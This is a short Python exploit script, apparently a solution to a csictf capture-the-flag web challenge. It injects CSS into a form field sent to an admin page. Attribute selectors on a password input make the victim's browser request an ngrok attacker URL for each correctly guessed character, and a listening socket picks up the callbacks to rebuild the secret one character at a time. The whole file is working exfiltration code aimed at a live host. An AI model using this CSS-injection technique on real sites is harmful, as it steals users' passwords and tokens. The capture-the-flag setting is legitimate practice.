import socket
import string
from threading import Thread

import requests as req

charset = '{_}' + string.ascii_lowercase + string.digits + string.ascii_uppercase

attacker_url = "http://068e8e9864fd.ngrok.io"
url = "http://chall.csivit.com:30256"


def gen_payload(password):
    return 'white;}} input[type="password"][value^="{}"]{{visibility: visible; background: url("{}")'.format(password,
                                                                                                             attacker_url)


def send_async_req(password, char):
    data = {"url": url + "/view", "color": gen_payload(password + char)}
    req.post(url=url + '/admin', data=data)


# The beginning of the flag is known
password = "csictf"

# Set a listening socket to check for password
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 4444))
sock.listen()
sock.settimeout(2)

while "}" not in password:
    for char in charset:
        Thread(target=send_async_req, args=[password, char]).start()
        try:
            sock.accept()
            password += char
            print(password, end='\r')
        except Exception as err:
            pass

print(f"\n[+] Flag is: {password}")
